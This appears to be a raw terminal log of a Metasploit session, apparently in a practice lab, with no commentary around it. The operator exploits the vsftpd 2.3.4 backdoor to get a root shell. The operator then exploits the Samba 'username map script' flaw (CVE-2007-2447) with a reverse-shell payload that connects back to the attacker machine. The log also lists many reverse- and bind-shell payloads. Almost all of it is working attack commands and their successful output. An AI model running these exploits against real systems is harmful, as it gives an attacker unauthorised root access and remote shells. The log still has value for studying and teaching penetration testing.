@@ -1,0 +1,548 @@
+┌──(kali㉿kali)-[~]
+└─$ msfconsole 
+Metasploit tip: Open an interactive Ruby terminal with irb
+                                                  
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search vsftpd
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor  
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info
+
+       Name: VSFTPD v2.3.4 Backdoor Command Execution
+     Module: exploit/unix/ftp/vsftpd_234_backdoor
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2011-07-03
+
+Provided by:
+  hdm <x@hdm.io>
+  MC <mc@metasploit.com>
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
+                                     basics/using-metasploit.html
+  RPORT   21               yes       The target port (TCP)
+
+Payload information:
+  Space: 2000
+  Avoid: 0 characters
+
+Description:
+  This module exploits a malicious backdoor that was added to the       VSFTPD download
+  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
+  June 30th 2011 and July 1st 2011 according to the most recent information
+  available. This backdoor was removed on July 3rd 2011.
+
+References:
+  OSVDB (73573)
+  http://pastebin.com/AetT9sS5
+  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.92.148
+RHOST => 192.168.92.148
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info
+
+       Name: VSFTPD v2.3.4 Backdoor Command Execution
+     Module: exploit/unix/ftp/vsftpd_234_backdoor
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2011-07-03
+
+Provided by:
+  hdm <x@hdm.io>
+  MC <mc@metasploit.com>
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS  192.168.92.148   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
+                                     basics/using-metasploit.html
+  RPORT   21               yes       The target port (TCP)
+
+Payload information:
+  Space: 2000
+  Avoid: 0 characters
+
+Description:
+  This module exploits a malicious backdoor that was added to the       VSFTPD download
+  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
+  June 30th 2011 and July 1st 2011 according to the most recent information
+  available. This backdoor was removed on July 3rd 2011.
+
+References:
+  OSVDB (73573)
+  http://pastebin.com/AetT9sS5
+  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads
+
+Compatible Payloads
+===================
+
+   #  Name                       Disclosure Date  Rank    Check  Description
+   -  ----                       ---------------  ----    -----  -----------
+   0  payload/cmd/unix/interact  .                normal  No     Unix Command, Interact with Established Connection
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use payloads /cmd/unix/interact
+[-] No results from search
+[-] Failed to load module: payloads
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payloads /cmd/unix/interact
+[!] Unknown datastore option: payloads. Did you mean PAYLOAD?
+payloads => /cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.92.148:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.92.148:21 - USER: 331 Please specify the password.
+[+] 192.168.92.148:21 - Backdoor service has been spawned, handling...
+[+] 192.168.92.148:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.92.147:42903 -> 192.168.92.148:6200) at 2024-11-13 01:32:53 -0500
+
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+cd dev
+exit
+[*] 192.168.92.148 - Command shell session 1 closed.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > back
+msf6 > search samba
+
+Matching Modules
+================
+
+   #   Name                                                         Disclosure Date  Rank       Check  Description
+   -   ----                                                         ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/citrix_access_gateway_exec               2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+   1   exploit/windows/license/calicclnt_getconfig                  2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
+   2     \_ target: Automatic                                       .                .          .      .
+   3     \_ target: Windows 2000 English                            .                .          .      .
+   4     \_ target: Windows XP English SP0-1                        .                .          .      .
+   5     \_ target: Windows XP English SP2                          .                .          .      .
+   6     \_ target: Windows 2003 English SP0                        .                .          .      .
+   7   exploit/unix/misc/distcc_exec                                2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+   8   exploit/windows/smb/group_policy_startup                     2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+   9     \_ target: Windows x86                                     .                .          .      .
+   10    \_ target: Windows x64                                     .                .          .      .
+   11  post/linux/gather/enum_configs                               .                normal     No     Linux Gather Configurations
+   12  auxiliary/scanner/rsync/modules_list                         .                normal     No     List Rsync Modules
+   13  exploit/windows/fileformat/ms14_060_sandworm                 2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   14  exploit/unix/http/quest_kace_systems_management_rce          2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
+   15  exploit/multi/samba/usermap_script                           2007-05-14       excellent  No     Samba "username map script" Command Execution
+   16  exploit/multi/samba/nttrans                                  2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   17  exploit/linux/samba/setinfopolicy_heap                       2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   18    \_ target: 2:3.5.11~dfsg-1ubuntu2 on Ubuntu Server 11.10   .                .          .      .
+   19    \_ target: 2:3.5.8~dfsg-1ubuntu2 on Ubuntu Server 11.10    .                .          .      .
+   20    \_ target: 2:3.5.8~dfsg-1ubuntu2 on Ubuntu Server 11.04    .                .          .      .
+   21    \_ target: 2:3.5.4~dfsg-1ubuntu8 on Ubuntu Server 10.10    .                .          .      .
+   22    \_ target: 2:3.5.6~dfsg-3squeeze6 on Debian Squeeze        .                .          .      .
+   23    \_ target: 3.5.10-0.107.el5 on CentOS 5                    .                .          .      .
+   24  auxiliary/admin/smb/samba_symlink_traversal                  .                normal     No     Samba Symlink Directory Traversal
+   25  auxiliary/scanner/smb/smb_uninit_cred                        .                normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   26  exploit/linux/samba/chain_reply                              2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
+   27    \_ target: Linux (Debian5 3.2.5-4lenny6)                   .                .          .      .
+   28    \_ target: Debugging Target                                .                .          .      .
+   29  exploit/linux/samba/is_known_pipename                        2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+   30    \_ target: Automatic (Interact)                            .                .          .      .
+   31    \_ target: Automatic (Command)                             .                .          .      .
+   32    \_ target: Linux x86                                       .                .          .      .
+   33    \_ target: Linux x86_64                                    .                .          .      .
+   34    \_ target: Linux ARM (LE)                                  .                .          .      .
+   35    \_ target: Linux ARM64                                     .                .          .      .
+   36    \_ target: Linux MIPS                                      .                .          .      .
+   37    \_ target: Linux MIPSLE                                    .                .          .      .
+   38    \_ target: Linux MIPS64                                    .                .          .      .
+   39    \_ target: Linux MIPS64LE                                  .                .          .      .
+   40    \_ target: Linux PPC                                       .                .          .      .
+   41    \_ target: Linux PPC64                                     .                .          .      .
+   42    \_ target: Linux PPC64 (LE)                                .                .          .      .
+   43    \_ target: Linux SPARC                                     .                .          .      .
+   44    \_ target: Linux SPARC64                                   .                .          .      .
+   45    \_ target: Linux s390x                                     .                .          .      .
+   46  auxiliary/dos/samba/lsa_addprivs_heap                        .                normal     No     Samba lsa_io_privilege_set Heap Overflow
+   47  auxiliary/dos/samba/lsa_transnames_heap                      .                normal     No     Samba lsa_io_trans_names Heap Overflow
+   48  exploit/linux/samba/lsa_transnames_heap                      2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+   49    \_ target: Linux vsyscall                                  .                .          .      .
+   50    \_ target: Linux Heap Brute Force (Debian/Ubuntu)          .                .          .      .
+   51    \_ target: Linux Heap Brute Force (Gentoo)                 .                .          .      .
+   52    \_ target: Linux Heap Brute Force (Mandriva)               .                .          .      .
+   53    \_ target: Linux Heap Brute Force (RHEL/CentOS)            .                .          .      .
+   54    \_ target: Linux Heap Brute Force (SUSE)                   .                .          .      .
+   55    \_ target: Linux Heap Brute Force (Slackware)              .                .          .      .
+   56    \_ target: Linux Heap Brute Force (OpenWRT MIPS)           .                .          .      .
+   57    \_ target: DEBUG                                           .                .          .      .
+   58  exploit/osx/samba/lsa_transnames_heap                        2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   59    \_ target: Automatic                                       .                .          .      .
+   60    \_ target: Mac OS X 10.4.x x86 Samba 3.0.10                .                .          .      .
+   61    \_ target: Mac OS X 10.4.x PPC Samba 3.0.10                .                .          .      .
+   62    \_ target: DEBUG                                           .                .          .      .
+   63  exploit/solaris/samba/lsa_transnames_heap                    2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   64    \_ target: Solaris 8/9/10 x86 Samba 3.0.21-3.0.24          .                .          .      .
+   65    \_ target: Solaris 8/9/10 SPARC Samba 3.0.21-3.0.24        .                .          .      .
+   66    \_ target: DEBUG                                           .                .          .      .
+   67  auxiliary/dos/samba/read_nttrans_ea_list                     .                normal     No     Samba read_nttrans_ea_list Integer Overflow
+   68  exploit/freebsd/samba/trans2open                             2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
+   69  exploit/linux/samba/trans2open                               2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
+   70  exploit/osx/samba/trans2open                                 2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
+   71  exploit/solaris/samba/trans2open                             2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
+   72    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .          .      .
+   73    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .          .      .
+   74  exploit/windows/http/sambar6_search_results                  2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
+   75    \_ target: Automatic                                       .                .          .      .
+   76    \_ target: Windows 2000                                    .                .          .      .
+   77    \_ target: Windows XP                                      .                .          .      .
+
+
+Interact with a module by name or index. For example info 77, use 77 or use exploit/windows/http/sambar6_search_results                                                                                                           
+After interacting with a module you can manually set a TARGET with set TARGET 'Windows XP'
+
+msf6 > search 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank       Check  Description
+   -  ----                                                   ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
+   1  auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/http/wp_easycart_privilege_escalation                                                                                                   
+
+msf6 > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > info
+
+       Name: Samba "username map script" Command Execution
+     Module: exploit/multi/samba/usermap_script
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2007-05-14
+
+Provided by:
+  jduck <jduck@metasploit.com>
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
+                                     basics/using-metasploit.html
+  RPORT   139              yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module exploits a command execution vulnerability in Samba
+  versions 3.0.20 through 3.0.25rc3 when using the non-default
+  "username map script" configuration option. By specifying a username
+  containing shell meta characters, attackers can execute arbitrary
+  commands.
+
+  No authentication is needed to exploit this vulnerability since
+  this option is used to map usernames prior to authentication!
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+  OSVDB (34700)
+  http://www.securityfocus.com/bid/23972
+  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
+  http://samba.org/samba/security/CVE-2007-2447.html
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > set RHOST 192.168.92.148
+RHOST => 192.168.92.148
+msf6 exploit(multi/samba/usermap_script) > info
+
+       Name: Samba "username map script" Command Execution
+     Module: exploit/multi/samba/usermap_script
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2007-05-14
+
+Provided by:
+  jduck <jduck@metasploit.com>
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS  192.168.92.148   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
+                                     basics/using-metasploit.html
+  RPORT   139              yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module exploits a command execution vulnerability in Samba
+  versions 3.0.20 through 3.0.25rc3 when using the non-default
+  "username map script" configuration option. By specifying a username
+  containing shell meta characters, attackers can execute arbitrary
+  commands.
+
+  No authentication is needed to exploit this vulnerability since
+  this option is used to map usernames prior to authentication!
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+  OSVDB (34700)
+  http://www.securityfocus.com/bid/23972
+  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
+  http://samba.org/samba/security/CVE-2007-2447.html
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
+   1   payload/cmd/unix/bind_awk                   .                normal  No     Unix Command Shell, Bind TCP (via AWK)
+   2   payload/cmd/unix/bind_busybox_telnetd       .                normal  No     Unix Command Shell, Bind TCP (via BusyBox telnetd)
+   3   payload/cmd/unix/bind_inetd                 .                normal  No     Unix Command Shell, Bind TCP (inetd)
+   4   payload/cmd/unix/bind_jjs                   .                normal  No     Unix Command Shell, Bind TCP (via jjs)
+   5   payload/cmd/unix/bind_lua                   .                normal  No     Unix Command Shell, Bind TCP (via Lua)
+   6   payload/cmd/unix/bind_netcat                .                normal  No     Unix Command Shell, Bind TCP (via netcat)
+   7   payload/cmd/unix/bind_netcat_gaping         .                normal  No     Unix Command Shell, Bind TCP (via netcat -e)
+   8   payload/cmd/unix/bind_netcat_gaping_ipv6    .                normal  No     Unix Command Shell, Bind TCP (via netcat -e) IPv6
+   9   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
+   10  payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   11  payload/cmd/unix/bind_r                     .                normal  No     Unix Command Shell, Bind TCP (via R)
+   12  payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   13  payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   14  payload/cmd/unix/bind_socat_sctp            .                normal  No     Unix Command Shell, Bind SCTP (via socat)
+   15  payload/cmd/unix/bind_socat_udp             .                normal  No     Unix Command Shell, Bind UDP (via socat)
+   16  payload/cmd/unix/bind_zsh                   .                normal  No     Unix Command Shell, Bind TCP (via Zsh)
+   17  payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
+   18  payload/cmd/unix/pingback_bind              .                normal  No     Unix Command Shell, Pingback Bind TCP (via netcat)
+   19  payload/cmd/unix/pingback_reverse           .                normal  No     Unix Command Shell, Pingback Reverse TCP (via netcat)
+   20  payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   21  payload/cmd/unix/reverse_awk                .                normal  No     Unix Command Shell, Reverse TCP (via AWK)
+   22  payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   23  payload/cmd/unix/reverse_jjs                .                normal  No     Unix Command Shell, Reverse TCP (via jjs)
+   24  payload/cmd/unix/reverse_ksh                .                normal  No     Unix Command Shell, Reverse TCP (via Ksh)
+   25  payload/cmd/unix/reverse_lua                .                normal  No     Unix Command Shell, Reverse TCP (via Lua)
+   26  payload/cmd/unix/reverse_ncat_ssl           .                normal  No     Unix Command Shell, Reverse TCP (via ncat)
+   27  payload/cmd/unix/reverse_netcat             .                normal  No     Unix Command Shell, Reverse TCP (via netcat)
+   28  payload/cmd/unix/reverse_netcat_gaping      .                normal  No     Unix Command Shell, Reverse TCP (via netcat -e)
+   29  payload/cmd/unix/reverse_openssl            .                normal  No     Unix Command Shell, Double Reverse TCP SSL (openssl)
+   30  payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   31  payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   32  payload/cmd/unix/reverse_php_ssl            .                normal  No     Unix Command Shell, Reverse TCP SSL (via php)
+   33  payload/cmd/unix/reverse_python             .                normal  No     Unix Command Shell, Reverse TCP (via Python)
+   34  payload/cmd/unix/reverse_python_ssl         .                normal  No     Unix Command Shell, Reverse TCP SSL (via python)
+   35  payload/cmd/unix/reverse_r                  .                normal  No     Unix Command Shell, Reverse TCP (via R)
+   36  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   37  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   38  payload/cmd/unix/reverse_socat_sctp         .                normal  No     Unix Command Shell, Reverse SCTP (via socat)
+   39  payload/cmd/unix/reverse_socat_tcp          .                normal  No     Unix Command Shell, Reverse TCP (via socat)
+   40  payload/cmd/unix/reverse_socat_udp          .                normal  No     Unix Command Shell, Reverse UDP (via socat)
+   41  payload/cmd/unix/reverse_ssh                .                normal  No     Unix Command Shell, Reverse TCP SSH
+   42  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+   43  payload/cmd/unix/reverse_tclsh              .                normal  No     Unix Command Shell, Reverse TCP (via Tclsh)
+   44  payload/cmd/unix/reverse_zsh                .                normal  No     Unix Command Shell, Reverse TCP (via Zsh)
+
+msf6 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse 
+payload => cmd/unix/reverse
+msf6 exploit(multi/samba/usermap_script) > info
+
+       Name: Samba "username map script" Command Execution
+     Module: exploit/multi/samba/usermap_script
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2007-05-14
+
+Provided by:
+  jduck <jduck@metasploit.com>
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS  192.168.92.148   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
+                                     basics/using-metasploit.html
+  RPORT   139              yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module exploits a command execution vulnerability in Samba
+  versions 3.0.20 through 3.0.25rc3 when using the non-default
+  "username map script" configuration option. By specifying a username
+  containing shell meta characters, attackers can execute arbitrary
+  commands.
+
+  No authentication is needed to exploit this vulnerability since
+  this option is used to map usernames prior to authentication!
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+  OSVDB (34700)
+  http://www.securityfocus.com/bid/23972
+  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
+  http://samba.org/samba/security/CVE-2007-2447.html
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 192.168.92.147:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo keT3RACN1DSVXGMq;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "keT3RACN1DSVXGMq\r\n"
+[*] Matching...
+[*] A is input...
+ls
+[*] Command shell session 2 opened (192.168.92.147:4444 -> 192.168.92.148:42643) at 2024-11-13 01:45:07 -0500
+
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+exit
+cd tmp
+[*] 192.168.92.148 - Command shell session 2 closed.
+msf6 exploit(multi/samba/usermap_script) > back
+msf6 > 
